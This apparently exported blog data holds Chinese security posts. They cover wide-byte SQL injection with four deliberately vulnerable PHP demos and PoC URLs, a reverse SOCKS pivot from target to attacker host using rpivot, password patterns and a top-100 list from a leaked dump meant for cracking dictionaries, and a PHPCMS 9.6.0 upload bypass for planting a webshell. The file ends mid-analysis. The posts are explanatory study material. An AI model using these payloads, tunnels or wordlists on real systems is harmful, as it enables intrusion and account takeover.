{"meta":{"title":"Anka9080's Notes","subtitle":"勿忘初心。","description":"Python,渗透测试,安全研发","author":"Anka9080","url":"http://www.evilclay.com"},"pages":[{"title":"categories","date":"2017-05-22T14:15:49.000Z","updated":"2017-05-22T14:16:00.319Z","comments":false,"path":"categories/index.html","permalink":"http://www.evilclay.com/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2017-05-22T14:40:17.000Z","updated":"2017-05-22T14:40:17.372Z","comments":true,"path":"tags/index-1.html","permalink":"http://www.evilclay.com/tags/index-1.html","excerpt":"","text":""},{"title":"tags","date":"2017-05-22T14:07:00.000Z","updated":"2017-05-22T14:15:30.287Z","comments":false,"path":"tags/index.html","permalink":"http://www.evilclay.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"宽字节注入深入研究","slug":"宽字节注入深入研究","date":"2017-07-20T13:18:21.000Z","updated":"2017-07-20T13:45:36.528Z","comments":true,"path":"2017/07/20/宽字节注入深入研究/","link":"","permalink":"http://www.evilclay.com/2017/07/20/宽字节注入深入研究/","excerpt":"","text":"一些概念单字节字符集： 所有的字符都使用一个字节来表示，比如 ASCII 编码。 多字节字符集： 在多字节字符集中，一部分字节用多个字节来表示，另一部分（可能没有）用单个字节来表示。 两位的多字节字符有一个前导字节和尾字节。 在某个多字节字符集内，前导字节位于某个特定范围内，尾字节也一样。 UTF-8 编码： 是一种编码的编码方式（多字节编码），它可以使用1~4个字节表示一个符号，根据不同的符号而变化字节长度。[1] 常见的宽字节： GB2312、GBK、GB18030、BIG5、Shift_JIS GB2312 不存在宽字节注入，可以收集存在宽字节注入的编码。 目的一提到 宽字节注入， 笔者首先会想到由于 后端 编码和 数据库编码的 不统一，导致用户的数据 绕过(吃掉)本身的转义符号（\\）从而数据 被当作 SQL 指令来执行。 这句话对不对呢，经过今天公司的 showcase 之后我产生了怀疑。 从而得到观点二： 宽字节注入的原因是因为 数据库后端采用了 非 单字节 编码，也就是说 UTF-8， GB2312 等都可以导致宽字节注入。 下面我们就来验证验证观点一和观点二到底那个正确。 最终的实验结论在这里：要有宽字节注入漏洞，首先要满足数据库后端使用双/多字节解析SQL语句，其次还要保证在该种字符集范围中包含低字节位是 0x5C(01011100) 的字符，初步的测试结果 Big5 和 GBK 字符集都是有的， UTF-8 和 GB2312 没有这种字符（也就不存在宽字节注入）。 SQL 执行原理网上遇到一个能较好体现 SQL 语句的解析&amp;执行过程的图片，在这里： SQL语句解析过程 SQL 在执行过程中，会分为如下几个部分： 客户端以某种字符生成SQL语句发送至服务器，这里“某种字符”其实是任意规定的，当 PHP 作为客户端连接 MySQL 的时候，这个字符集就是 PHP 的默认编码。 服务器接收到请求后会把客户端编码的字符串转换成连接层编码字符串（具体流程是先使用系统变量 character_set_client 对 SQL 语句进行解码后 会使用 系统变量 character_set_connection 对解码后的十六进制进行编码）。 进行内部操作前，将 请求 按照如下规则转化成内部操作字符集，如下： 3.1 使用字段 CHARACTER SET 设定值； 3.2 若上述值不存在，使用对应数据表的DEFAULT CHARACTER SET设定值； 3.3 若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值； 3.4 若上述值不存在，则使用character_set_server设定值。 执行完 SQL 语句之后，将执行结果按照 character_set_results 编码进行输出。 使用 SET NAMES 命令可以把 character_set_client character_set_client character_set_results 设置成统一的字符编码，比如： 使用这一步的命令结果会使用 MySQL 数据库使用 gbk 的编码对客户端传来 SQL 语句进行解析执行，并把结果集以 gbk 编码的形式输出。 实验参照 深入探究宽字节注入漏洞与修补原理 这篇文章我们来进行一些实验，从而从 SQL执行原理上对 宽字节注入进行分析。 情景一在 PHP 代码中使用 mysql_query(“set names GBK”)； 指定三个字符集（客户端、连接层、结果集）都是GBK编码。 场景代码如下 demo1.php ： &lt;?php $name = addslashes($_GET[&apos;name&apos;]); $con=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;fuckroot&quot;,&quot;sqli&quot;); if (mysqli_connect_errno($con)) { echo &quot;连接 MySQL 失败: &quot; . mysqli_connect_error(); } // 执行查询 $sql = &quot;select * from user where name = &apos;&quot;.$name.&quot;&apos;&quot;; echo &quot;SQL:&quot;.$sql.&quot;&lt;br&gt;&quot;; mysqli_query($con,&quot;set names GBK&quot;); $result = mysqli_query($con,$sql); if(!$result){ // 打印错误原因 printf(&quot;Error: %s\\n&quot;, mysqli_error($con)); } // echo(&quot;Res num_rows:&quot;.$result-&gt;num_rows.&quot;&lt;br&gt;&quot;); // 一条条获取 while ($row=mysqli_fetch_row($result)) { printf (&quot;%s : %s&quot;,$row[0],$row[1]); echo &quot;&lt;br&gt;&quot;; } // 释放结果集合 mysqli_free_result($result); // $row=mysqli_fetch_row($result); echo &quot;Closed!&quot;; mysqli_close($con); ?&gt; PoC访问 http://ubuntu.com/sqli_widebytes/demo1.php?name=111%de‘ or 1=1 – x 可以发现 or 1=1 已经被成功执行，结果集不为空。 为了可以清晰的追踪 SQL 语句的执行过程，我们把 SQL 语句的执行 log 打印出来，配置方式参考 这里 可以看到 先设置 客户端、连接层、结果集 都是 GBK 编码，然后执行下面的SQL语句 ： select * from user where name = &apos;111�\\&apos; or 1=1 -- x&apos; 下面分析 这条语句是如何生成的： 111%de’ or 1=1 – x —-经过 URL 解码—-&gt; 1110xDE’ or 1=1 –x —-经过 addslashes 处理—-&gt; 1110xDE\\’ or 1=1 –x ，随后拼接成如下 SQL 语句： select * from user where name = &apos;1110xDE\\&apos; or 1=1 -- x&apos; 由于在 bash 默认编码环境中 十六进制字符 0xDE 是不可显示字符，所以在 查询 log 中 会用 乱码 � 代替 0xDE。 接下来分析这条SQL语句是如何被解析执行的： 由于前面设定了 客户端 和 连接层都是使用 GBK 编码，现在需要使用 GBK 对传来的 SQL 语句进行解析。 \\ 的十六进制是 0x5C，由于十六进制 0xDE5C 会被 GBK 解码成 一个生僻的汉字 轡 所以 GBK 解码之后执行的 SQL 语句是： select * from user where name = ‘111轡’ or 1=1 – x’ addslashes 转移的 反斜杠被吃掉，导致最终的 SQL 语句执行。 一句话总结起来是 转义后的反斜杠与之前的十六进制字符 0x5C 在 GBK 编码情况下被解析成新一个双字节字符（轡），进而用户输入的单引号逃逸，导致 SQL 注入。 情景二使用 set names UTF-8 指定了 UTF-8 字符集，在 addslashes 函数处理之后使用 转码函数进行转码处理。比如有时候，为了避免乱码，会将一些用户提交的 GBK 字符使用 iconv 函数（或者mb_convert_encoding）先转为 UTF-8，然后再拼接入 SQL 语句。 场景代码如下 demo2.php： &lt;?php $name = iconv(&quot;GBK&quot;,&quot;UTF-8&quot;, addslashes($_GET[&apos;name&apos;])) ; $con=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;fuckroot&quot;,&quot;sqli&quot;); if (mysqli_connect_errno($con)) { echo &quot;连接 MySQL 失败: &quot; . mysqli_connect_error(); } // 执行查询 $sql = &quot;select * from user where name = &apos;&quot;.$name.&quot;&apos;&quot;; echo &quot;SQL:&quot;.$sql.&quot;&lt;br&gt;&quot;; mysqli_query($con,&quot;set names UTF-8&quot;); $result = mysqli_query($con,$sql); if(!$result){ // 打印错误原因 printf(&quot;Error: %s\\n&quot;, mysqli_error($con)); } // 一条条获取 while ($row=mysqli_fetch_row($result)) { printf (&quot;%s : %s&quot;,$row[0],$row[1]); echo &quot;&lt;br&gt;&quot;; } // 释放结果集合 mysqli_free_result($result); // $row=mysqli_fetch_row($result); echo &quot;Closed!&quot;; mysqli_close($con); ?&gt; PoC访问 http://ubuntu.com/sqli_widebytes/demo2.php?name=111%B3‘ or 1=1 – x 同样导致了SQL注入，这里原理就比较好玩了。 先说结论： 由于 addslashed 转义后生成的 反斜杠（\\），被 iconv 函数 在从 GBK 到 UTF-8 转码的过程中吃掉了，所以进入MySQL服务器之前用户输入单引号已经逃逸。 现在来一步一步理一下这个过程： %B3’ or 1=1 – x —经过 URL Decode 处理—-&gt; 0xB3’ or 1=1 – x — 经过 addslashed 处理 —&gt; 0xB3\\’ or 1=1 – x 然后经过 转码函数 iconv(&quot;GBK&quot;,&quot;UTF-8&quot;, &lt;payload&gt;) 处理， 这一步是比较有意思的，需要深入分析下： 首先要理解这个神奇的转码函数 iconv() 是用来干嘛的。 大家都知道 无论什么编码的文字，都会以十六进制（其实是二进制，十六进制便于表述）的方式保存在磁盘中。 也就是说相同的一个 字符，比如 睿 ， 他在 UTF-8 和 GBK 的编码方式下存储的十六进制是不同的，如下图所示： 可以 看出相同的 字符 睿 ，在 GBK 编码的情况下 和 UTF-8 的情况下 分别存储成 EEA3 和 E79DBF。 所以 iconv(“GBK”,”UTF-8”, “睿”) 其实就是把 对应的二进制从 EEA3 转换成 E79DBF 的过程，只不过编码不同，表示的还是同一个字符。 接着按照之前的分析 首先对十六进制的 payload 进行 GBK 解码处理，得到真正 想要表达的字符。 0xB3\\’ or 1=1 – x 的 十六进制表现形式 0xB35C 27 20 6F 72 20 31 3D 31 20 2D 2D 20 78 20 可以把 0xB35C 27 20 6F 72 20 31 3D 31 20 2D 2D 20 78 20 理解成经过 GBK 编码后存储内存中的真实数据，先用 GBK 对其进行解码看看其是什么样的字符 重点是 GBK 会把 B35C 解码成一个中文字符 砛 ，如下： 把所有十六进制解码成 砛’ or 1=1 – x 可以发现 使用 GBK 对输入的数据进行 解码处理在这一步已经把 转义的反斜杠给吃掉了，后面就是 使用 UTF-8 编码对这段字符编码成十六进制的形式存储在内存中的故事了。 UTF-8 编码的结果如下所示： 合在一起就是 0xE7A09B 27 20 6F 72 20 31 3D 31 20 2D 2D 20 78 20 ，根据编码结果可以看出 GBK 和 UTF-8 对 1-127 范围内的字符编码都是沿用了 ASCII 码，结果是相同的。 到这一步我们得到了 数据库接收 SQL 语句的 十六进制形式，下面根据 SET NAMES UTF8 可知数据库会用 UTF-8 编码对这段语句进行解码， 当然结果其实已经知道了，UTF-8 的解码结果就是 砛’ or 1=1 – x 所以说最终执行的 SQL 语句是： select * from user where name = ‘111砛’ or 1=1 – x’ 场景三这个场景和场景二有些类似，在 iconv 的使用上与上一个相反，用 iconv 函数是用来把 UTF-8 的编码转换成 GBK 编码。 按理说这种用法应该不会常见，因为转换成 GBK 编码的数据最后插入数据库时会用 UTF-8 的编码来解析导致最后的单引号溢出，奇怪的74CMS 3.4版本还真有这样一个漏洞，相关的分析在这篇文章里，说句题外话，看到最后的ID 才发现是我的一位大牛学长早期的作品，厉害厉害。 代码在这里（demo3.php）： &lt;?php $name = iconv(&quot;UTF-8&quot;,&quot;GBK&quot;, addslashes($_GET[&apos;name&apos;])) ; $con=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;fuckroot&quot;,&quot;sqli&quot;); // 执行查询 $sql = &quot;select * from user where name = &apos;&quot;.$name.&quot;&apos;&quot;; echo &quot;SQL:&quot;.$sql.&quot;&lt;br&gt;&quot;; // mysqli_query($con,&quot;set names UTF-8&quot;); $result = mysqli_query($con,$sql); // echo(&quot;Res num_rows:&quot;.$result-&gt;num_rows.&quot;&lt;br&gt;&quot;); // 一条条获取 while ($row=mysqli_fetch_row($result)) { printf (&quot;%s : %s&quot;,$row[0],$row[1]); echo &quot;&lt;br&gt;&quot;; } // 释放结果集合 mysqli_free_result($result); // $row=mysqli_fetch_row($result); echo &quot;Closed!&quot;; mysqli_close($con); ?&gt; PoC访问 ：http://ubuntu.com/sqli_widebytes/demo3.php?name=錦‘ or 1=1 – x 输出： 其实这里访问 http://ubuntu.com/sqli_widebytes/demo3.php?name=%E9%8C%A6‘ or 1=1 – x 得到的效果也是一样的。 这里参考上一个场景的分析直接从 十六进制 的这个请求开始啦 %E9%8C%A6’ or 1=1 – x — URL解码 —&gt; 0xE98CA6’ or 1=1 – x — addslashes处理 —&gt; 0xE98CA6\\’ or 1=1 – x 由于 E98CA6 是 錦 的十六进制编码，所以使用 iconv 转换成后得到的 GBK 编码如下： 所以 payload 经过 iconv 转换后 的十六进制结果是 0xE55C5C 27 20 6F 72 20 31 3D 31 20 2D 2D 20 78 得到了 发送给数据库的十六进制的 Payload，现在使用默认的 UTF-8 编码对数据进行解码，得到 �\\‘ or 1=1 – x 因为 E5 不被 UTF-8 编码所识别，所以转换成乱码，从而， 从 錦 分离出的 5C 和 转义生成 5C 组成 \\，也就是把转义生成的反斜杠给转义了，导致用户输入的单引号逃逸。 情景四先使用 iconv 进行字符集转换，将UTF-8转为GBK，然后使用 addslashes 函数对特殊字符进行转义，同时，set names字符集为GBK。 这种场景确实比较少见，不过也并不是不会存在，下面给出场景代码： 场景四 （demo4.php） &lt;?php $name = iconv(&quot;UTF-8&quot;,&quot;GBK&quot;, $_GET[&apos;name&apos;]) ; $name = addslashes($name); $con=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;fuckroot&quot;,&quot;sqli&quot;); if (mysqli_connect_errno($con)) { echo &quot;连接 MySQL 失败: &quot; . mysqli_connect_error(); } // 执行查询 $sql = &quot;select * from user where name = &apos;&quot;.$name.&quot;&apos;&quot;; echo &quot;SQL:&quot;.$sql.&quot;&lt;br&gt;&quot;; mysqli_query($con,&quot;set names GBK&quot;); $result = mysqli_query($con,$sql); if(!$result){ // 打印错误原因 printf(&quot;Error: %s\\n&quot;, mysqli_error($con)); } // 一条条获取 while ($row=mysqli_fetch_row($result)) { printf (&quot;%s : %s&quot;,$row[0],$row[1]); echo &quot;&lt;br&gt;&quot;; } // 释放结果集合 mysqli_free_result($result); // $row=mysqli_fetch_row($result); echo &quot;Closed!&quot;; mysqli_close($con); ?&gt; PoC访问 http://ubuntu.com/sqli_widebytes/demo4.php?name=錦‘ or 1=1 – x 显示（需要把页面编码设置成简体中文）： 该场景下 PoC 与 场景三的 PoC 完全一致，但是 处理的过程却不是相同的。 錦’ or 1=1 – x — 经过iconv转换成GBK编码 —&gt; 0xE55C27 or 1=1 – x — 经过addslashes处理 —&gt; 0xE55C5C5C27 or 1=1 – x 可以看出使用addslashes处理时，不仅转义了单引号，还转移了5C，这是为啥呢，因为addslashes会把输入的字符当做 UTF-8 处理，导致对 5C（UTF-8的反斜杠）也进行了转义，最后 MySQL 服务器接收到 该 Payload 之后使用 GBK 编码的方式进行解码： 錦\\‘ or 1=1 – x 经过两个转义 配合 GBK 对 SQL 语句进行解码导致了 最后 单引号成功逃逸，不容易啊。 总结至此关于手上的宽字节注入场景分析完毕，可以看出 在使用UTF-8 对 SQL 语句进行解析时，若想发生 注入，并不是在 解析 MySQL 语句的阶段，而是在客户端提交到 服务器之前就已经发生了 SQL 注入，所以这种注入 并不是 UTF-8 编码的锅， 统一使用 UTF-8 编码并且不要使用危险的函数 iconv 是一个比较安全的编码方案。 如果由于历史遗留原因一定要使用 GBK 的编码（解析）方式，可以采用 mysql_set_charset 配合 mysql_real_escape_string 转义的方式进行防护。可以参考 文章末尾提供的案例，行了，晚安。 参考 http://www.ruanyifeng.com/blog/2007/10/ascii_unicode_and_utf-8.html http://www.laruence.com/2008/01/05/12.html https://dev.mysql.com/doc/refman/5.7/en/charset-connection.html http://blog.csdn.net/u011721501/article/details/42874517 http://www.cnbraid.com/2016/sql4.html","categories":[],"tags":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"http://www.evilclay.com/tags/漏洞分析/"},{"name":"SQL注入","slug":"SQL注入","permalink":"http://www.evilclay.com/tags/SQL注入/"},{"name":"宽字节注入","slug":"宽字节注入","permalink":"http://www.evilclay.com/tags/宽字节注入/"}]},{"title":"部署阿里云免费HTTPS证书笔记","slug":"部署阿里云免费HTTPS证书笔记","date":"2017-06-12T12:39:11.000Z","updated":"2017-06-12T12:40:15.581Z","comments":true,"path":"2017/06/12/部署阿里云免费HTTPS证书笔记/","link":"","permalink":"http://www.evilclay.com/2017/06/12/部署阿里云免费HTTPS证书笔记/","excerpt":"","text":"系统环境Ubuntu 16.04 Apache2 设置域名A记录 注意：已经存在的网站不需要这一步操作。 这一步是用来把 域名 绑定到指定的 IP 上，访问域名会直接返回 IP 的 Web 默认路径。 在控制台新增加一条域名(x.evilclay.com)的A记录解析： 新建虚拟主机 注意：已经存在的网站也不需要这一步操作。 之前写的笔记 Apache绑定多域名or多端口配置命令 中的多域名相关配置写的就是这一部分的配置，在这里直接搞吧。 新建 x.evilclay.com 作为新的虚拟主机。 在 /etc/apache2/sites-enable/目录下新建 x.evilclay.com.conf 配置文件，内容如下： &lt;VirtualHost *:80&gt; ServerName x.evilclay.com # 域名 ServerAdmin webmaster@localhost DocumentRoot /var/www/html/x.evilclay.com # 虚拟主机目录 ErrorLog ${APACHE_LOG_DIR}/error_x.evilclay.com.log CustomLog ${APACHE_LOG_DIR}/access_x.evilclay.com.log combined &lt;/VirtualHost&gt; 为了测试是否成功 在 /var/www/html 中创建 x.evilclay.com 目录，新建 hello.txt 文件用来测试配置是否成功，内容如下： ubuntu@evilclay:/var/www/html/x.evilclay.com$ cat hello.txt Hello Baby! 重启 apache2 使用浏览器访问 http://x.evilclay.com/hello.txt ，显示如下： 可以看出新建的虚拟主机 x.evilclay.com 已经可以成功解析。 申请阿里云免费证书 登录：阿里云控制台，产品与服务，证书服务，购买证书。 购买：证书类型选择 免费型DV SSL，然后完成购买。 补全：在 我的证书 控制台，找到购买的证书，在操作栏里选择 补全。填写证书相关信息，在这一步，我的域名填写成 x.evilclay.com，对应修改成上一部你的域名。 域名验证：可以选择 DNS，如果域名用了阿里云的 DNS 服务，再勾选一下 证书绑定的域名在 阿里云的云解析。 上传：系统生成 CSR，点一下 创建。 提交审核。 根据提示，24小时内会给出审核结果，审核通过如下： 点击操作-下载按钮，把证书的相关密钥下载到本地，待会需要上传到服务器上。 主要包含： 证书文件214144412712457.pem 证书私钥文件214144412712457.key 证书公钥文件public.pem 证书链文件chain.pem。 服务器配置HTTPS证书登陆到服务器上，先安装HTTPS证书相关库： sudo apt-get install openssl 之后在 /etc/apache2 目录下新建 cert 目录，并把刚这四个文件上传到该目录。 sudo cd /etc/apache2 sudo mkdir cert 启用 Apache 的 SSL 模块： sudo a2enmod ssl 再配置服务器域名绑定： sudo cp /etc/apache2/sites-enabled/x.evilclay.com /etc/apache2/sites-enabled/x.evilclay.com_ssl sudo vim x.evilclay.com_ssl 在段中，DocumentRoot一行的下方加入内容： # 添加 SSL 协议支持协议，去掉不安全的协议 SSLProtocol TLSv1 TLSv1.1 TLSv1.2 # 修改加密套件如下 SSLCipherSuite ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4 # 证书公钥配置 SSLCertificateFile /etc/apache2/cert/public.pem # 证书私钥配置 SSLCertificateKeyFile /etc/apache2/cert/214144412790737.key # 证书链配置，如果该属性开头有 &apos;#&apos;字符，请删除掉 SSLCertificateChainFile /etc/apache2/cert/chain.pem 端口修改为：443，即(ssl的端口) 重启 Apache2, 访问 https://x.evilclay.com/hello.txt 再次进行测试： 至此，从新建虚拟主机到配置HTTPS证书已经完成。 HTTP请求重定向HTTPS在配置文件里对 80 端口的流量做一个重定向即可： vim /etc/apache2/sites-available/x.evilclay.com.conf //在&lt;VirtualHost *:80&gt;&lt;/VirtualHost&gt; 标签内加入下面一行 Redirect permanent / https://x.evilclay.com/ 今后访问 http://x.evilclay.com 会自动跳转到 https://x.evilclay.com/，确保所有网站流量走 HTTPS 通讯。 参考 https://yundun.console.aliyun.com/ https://ninghao.net/blog/4449 http://blog.csdn.net/trh0123/article/details/70932448 https://www.howtoing.com/apache-redirect-http-to-https/","categories":[],"tags":[{"name":"HTTPS","slug":"HTTPS","permalink":"http://www.evilclay.com/tags/HTTPS/"}]},{"title":"SOCKS4反向代理实验","slug":"SOCKS4反向代理实验","date":"2017-06-11T14:17:30.000Z","updated":"2017-06-11T14:20:02.465Z","comments":true,"path":"2017/06/11/SOCKS4反向代理实验/","link":"","permalink":"http://www.evilclay.com/2017/06/11/SOCKS4反向代理实验/","excerpt":"","text":"原理SOCKS4 反向代理是 先在 服务器A （比如攻击机） 上运行 SOCKS4 代理的 服务端程序监听指定端口，然后 在客户机（比如靶机）上运行 客户端程序连接服务器的指定端口。 这样就建立了一条 从 靶机 到攻击机的反向 SOCKS 隧道，攻击机的应用程序（比如 wget nmap curl …）使用该隧道后，程序的所有流量都会先经过靶机转发出去。 接着大家说说相关名词的概念 :P SOCKS代理：是一种网络协议，主要用于客户端和服务器的中间通讯（并不是我们说的socket套接字）。SOCKS代理工作在比HTTP代理更低的层次，HTTP代理只是将HTTP请求转发到目标HTTP服务器。SOCKS代理可以转发UDP流量和反向代理，HTTP代理不能。 SOCKS代理目前常用 SOCKS4 代理和 SOCKS5 代理两种版本，SOCKS4 只支持 TCP 代理， SOCK5 还支持 UDP代理， 验证 以及 IPv6. [1] proxychains： Linux下 强制应用程序 使用 Tor， SOCKS4/5代理， HTTP(S) 代理的一款工具。 下面，以 GitHub 上的 https://github.com/artkond/rpivot [2] 项目演示 使用 SOCKS4 反向代理。 服务器监听下载 https://github.com/artkond/rpivot 并解压。 运行 server.py 监听本地外网9999端口： python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080 客户机连接下载 https://github.com/artkond/rpivot 并解压。 运行 client.py 连接服务器的 9999 端口： python client.py --server-ip &lt;rpivot_server_ip&gt; --server-port 9999 服务器使用代理先下载 proxychains 工具： apt get install proxychains 修改配置文件，设置 SOCKS4 代理： vim /etc/proxychains.conf // 添加 socks4 代理 [ProxyList] socks4 127.0.0.1 1080 现在使用 curl 命令不使用 代理请求 ip.cn: 对 curl 使用代理后访问 ip.cn: 参考 https://zh.wikipedia.org/wiki/SOCKS https://github.com/artkond/rpivot","categories":[],"tags":[{"name":"反向代理","slug":"反向代理","permalink":"http://www.evilclay.com/tags/反向代理/"},{"name":"SOCKS4","slug":"SOCKS4","permalink":"http://www.evilclay.com/tags/SOCKS4/"}]},{"title":"1.5W条密码样本分析","slug":"1-5W条密码样本分析","date":"2017-06-02T17:17:25.000Z","updated":"2017-06-02T17:24:00.679Z","comments":true,"path":"2017/06/03/1-5W条密码样本分析/","link":"","permalink":"http://www.evilclay.com/2017/06/03/1-5W条密码样本分析/","excerpt":"","text":"引言之前对某公开的一段密码库做的一个分析，目的是想得到大家的密码组合规律，无奈一直没用上，在笔记里备份下，以后想针对姓名做组合字典的时候再回头看看。 直接贴出当时的分析结果啦~(≧▽≦)/~ 组合规律姓 + 6位数字 8位生日 + 两个字母 一位字母+123456 姓名首字母+123 名拼音+520 姓拼音+6位生日 123456+姓名首字母 姓名首字母+6位数字 姓名+000 a+QQ号 小名(名连读)+1111 姓+123 姓名首字母+4位生日年份 4位生日年份+名拼音 名拼音+6位生日 6位数字+姓名首字母 姓名+4位数字 姓拼音+生日年份 姓名首字母+4位生日月份天数 姓首字母+6位数字 姓名首字母+1234 6位生日(月份+1)+名拼音 qwerty+6538 姓名首字母+6位生日 姓名首字母+4位数字 姓名首字母+123456 对象姓名首字母+6位生日 123456+姓 名+4位数字 姓名首字母+4位年份+2随机数字 姓+123123 名+4位年份 姓首字母+2位月份+4位年份 姓+年份最后2位 姓名首字母+4位年份+ 1位月份(生日-1)+1位天数 姓名首字母+4位年份+2位月份 6位对象生日+姓名首字母 姓首字母+名+生日年份 对象首字母+520 2个字母+123321 对象首字母+8位生日 对象首字母+520520 520+对象首字母 姓+258369 TOP 20a123456 qwe123456 qwe123 asd123456 123456a qq123456 asd123 qwer1234 123456AA aaa123456 a123123 qaz123 aa123456 123123aa abcd1234 a123456789 a112233 woaini1314 123QWE qwe123123 TOP 50a123456 qwe123456 qwe123 asd123456 123456a qq123456 asd123 qwer1234 123456AA aaa123456 a123123 qaz123 aa123456 123123aa abcd1234 a123456789 a112233 woaini1314 123QWE qwe123123 aa123123 q123456 y123456 qaz123456 z123456 aini1314 a1234567 w123456 woaini520 1234qwer qq112233 zj5201314 abc123456 qq111111 a2329765 love1314 a111111 a147258 woaini123 123123a a123456a wu123456 asdf1234 qqq111 zxcvbnm123 ll123456 123456asd li123456 123456z a12345 TOP 100a123456 qwe123456 qwe123 asd123456 123456a qq123456 asd123 qwer1234 123456AA aaa123456 a123123 qaz123 aa123456 123123aa abcd1234 a123456789 a112233 woaini1314 123QWE qwe123123 aa123123 q123456 y123456 qaz123456 z123456 aini1314 a1234567 w123456 woaini520 1234qwer qq112233 zj5201314 abc123456 qq111111 a2329765 love1314 a111111 a147258 woaini123 123123a a123456a wu123456 asdf1234 zxcvbnm123 ll123456 123456asd li123456 123456z a12345 aa000000 aaa123123 qq123123 qqq111 a5201314 zhang123 aaa123789 a1314520 yang1314 zxc123456 liushu123 zhang520 qweqwe123 zx123456 li5201314 aaa111 xiao520 xiang520 w123456789 liu6577453 zhang1314 wang12345 zhong123 ws640805 hh124124 nn23456 x891104 c123456 qwe12345 159951a z520520 hai520 qqww1122 qwe112233 1995312w b123456 bb5201314 qqq123 qwe123355 zy584520 mima123 cwt123456 zhuzhu520 pmwdea58 peng1989 LMJ831023 chm420924 123456qq 123qaz woaini8023 zhou123","categories":[],"tags":[{"name":"密码规律","slug":"密码规律","permalink":"http://www.evilclay.com/tags/密码规律/"}]},{"title":"PHPCMSv9.6.0任意文件上传漏洞分析","slug":"PHPCMSv9-6-0任意文件上传漏洞分析","date":"2017-05-09T18:57:49.000Z","updated":"2017-05-09T19:07:45.196Z","comments":true,"path":"2017/05/10/PHPCMSv9-6-0任意文件上传漏洞分析/","link":"","permalink":"http://www.evilclay.com/2017/05/10/PHPCMSv9-6-0任意文件上传漏洞分析/","excerpt":"","text":"漏洞描述本次漏洞产生的原因是因为PHPCMS程序在下载远程/本地文件时没有对文件的类型做正确的效验导致可以下载PHP脚本，同时下载之后的文件名可以使用暴力破解的方式或者是数据库插入报错的形式获得，所以把预先准备好的一句话木马下载到服务器上，最后使用客户端连接拿到shell。 漏洞点漏洞存在于 \\phpcmsv9.6.0\\phpcms\\libs\\classes\\attachment.class.php 的 download 函数，这是一个附件下载的函数： /** * 附件下载 * Enter description here ... * @param $field 预留字段 * @param $value 传入下载内容 * @param $watermark 是否加入水印 * @param $ext 下载扩展名 * @param $absurl 绝对路径 * @param $basehref */ function download($field, $value,$watermark = &apos;0&apos;,$ext = &apos;gif|jpg|jpeg|bmp|png&apos;, $absurl = &apos;&apos;, $basehref = &apos;&apos;) { global $image_d; $this-&gt;att_db = pc_base::load_model(&apos;attachment_model&apos;); $upload_url = pc_base::load_config(&apos;system&apos;,&apos;upload_url&apos;); $this-&gt;field = $field; $dir = date(&apos;Y/md/&apos;); $uploadpath = $upload_url.$dir; $uploaddir = $this-&gt;upload_root.$dir; $string = new_stripslashes($value); if(!preg_match_all(&quot;/(href|src)=([\\&quot;|&apos;]?)([^ \\&quot;&apos;&gt;]+\\.($ext))\\\\2/i&quot;, $string, $matches)) return $value; $remotefileurls = array(); foreach($matches[3] as $matche) { if(strpos($matche, &apos;://&apos;) === false) continue; dir_create($uploaddir); $remotefileurls[$matche] = $this-&gt;fillurl($matche, $absurl, $basehref); } unset($matches, $string); $remotefileurls = array_unique($remotefileurls); $oldpath = $newpath = array(); foreach($remotefileurls as $k=&gt;$file) { if(strpos($file, &apos;://&apos;) === false || strpos($file, $upload_url) !== false) continue; $filename = fileext($file); $file_name = basename($file); $filename = $this-&gt;getname($filename); $newfile = $uploaddir.$filename; $upload_func = $this-&gt;upload_func; if($upload_func($file, $newfile)) { $oldpath[] = $k; $GLOBALS[&apos;downloadfiles&apos;][] = $newpath[] = $uploadpath.$filename; @chmod($newfile, 0777); $fileext = fileext($filename); if($watermark){ watermark($newfile, $newfile,$this-&gt;siteid); } $filepath = $dir.$filename; $downloadedfile = array(&apos;filename&apos;=&gt;$filename, &apos;filepath&apos;=&gt;$filepath, &apos;filesize&apos;=&gt;filesize($newfile), &apos;fileext&apos;=&gt;$fileext); $aid = $this-&gt;add($downloadedfile); $this-&gt;downloadedfiles[$aid] = $filepath; } } return str_replace($oldpath, $newpath, $value); } 待下载的附件$value 首先经过 new_stripslashes 处理： /** * 返回经stripslashes处理过的字符串或数组 * @param $string 需要处理的字符串或数组 * @return mixed */ function new_stripslashes($string) { if(!is_array($string)) return stripslashes($string); foreach($string as $key =&gt; $val) $string[$key] = new_stripslashes($val); return $string; } 这一步是删除由 addslashes() 函数添加的反斜杠 的字符串或数组。 然后对下载地址进行一次正则匹配： preg_match_all(&quot;/(href|src)=([\\&quot;|&apos;]?)([^ \\&quot;&apos;&gt;]+\\.($ext))\\\\2/i&quot;, $string, $matches) 由于 $ext = ‘gif|jpg|jpeg|bmp|png’ 所以这里可以匹配的URL只需要满足 类似 src=”http://xxx/xxx.jpg“ 的形式即可。 经过正则匹配后 $matches[3] 的每个元素链接了 http://xxx/xxx.jpg 的形式，在这里可以说对后缀名进行了一次验证，但这种验证的方式有问题， 由于没有考虑到 URL 中的 ? 和 # 的特殊性，所以这里验证的文件后缀名并不是真正的文件后缀。 比如，一个 百度的地址是 https://www.baidu.com/index.php， 使用 https://www.baidu.com/index.php?1.jpg 或者 https://www.baidu.com/index.php#1.jpg 都可以访问。 接着进入对 URL 进行补全的逻辑代码： $remotefileurls[$matche] = $this-&gt;fillurl($matche, $absurl, $basehref); 重点是 fillurl 函数的这段代码： $pos = strpos($surl,&apos;#&apos;); if($pos&gt;0) $surl = substr($surl,0,$pos); 直接把url中包含 # 符号及之后的字符串全部都清掉。配合之前的正则匹配成功的bypass了一次图片后缀名验证。 比如我们的 URL 地址设置为： http://www.foo.com/1.txt?1.php#1.jpg 去掉 # 之后就是 http://www.foo.com/1.txt?1.php 在 fillurl 中后面就是无关紧要的 return 操作了，我们继续。 下面有一次获取文件后缀名和生成文件名的操作。 $filename = fileext($file); $filename = $this-&gt;getname($filename); 我们追踪 fileext函数： function fileext($filename) { return strtolower(trim(substr(strrchr($filename, &apos;.&apos;), 